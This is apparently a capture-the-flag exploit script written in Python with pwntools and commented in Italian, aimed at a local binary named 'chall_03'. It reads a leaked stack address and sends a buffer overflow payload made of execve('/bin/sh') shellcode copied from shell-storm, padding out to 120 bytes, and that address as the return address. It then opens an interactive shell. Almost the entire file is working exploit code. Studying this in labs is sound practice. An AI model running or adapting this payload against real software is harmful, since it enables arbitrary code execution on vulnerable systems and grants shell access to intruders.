#!/bin/python3
from pwn import *

p = process("./chall_03")

#Saltiamo l'input non vulnerabile
p.sendline()

ignored_output = p.recvuntil("I\'ll make it: ")
             #Convertiamo in intero (numero in base 16)
stack_variable_address = int(p.recvline(), 16)

"""
cyclic output: 120

Shellcode by: http://shell-storm.org/shellcode/files/shellcode-806.php
Shellcode: "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
"""

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

'''
Costruzione del payload:
|                    120                    |       8       |
| len(shellcode) |   120 - len(shellcode)   |       8       |
|   shell code   |          padding         |  buffer_addr  |
'''

payload = shellcode +\
            b"B"* ( 120 - len(shellcode) ) +\
            p64(stack_variable_address) #buffer_addr
            
p.sendline(payload)

p.interactive()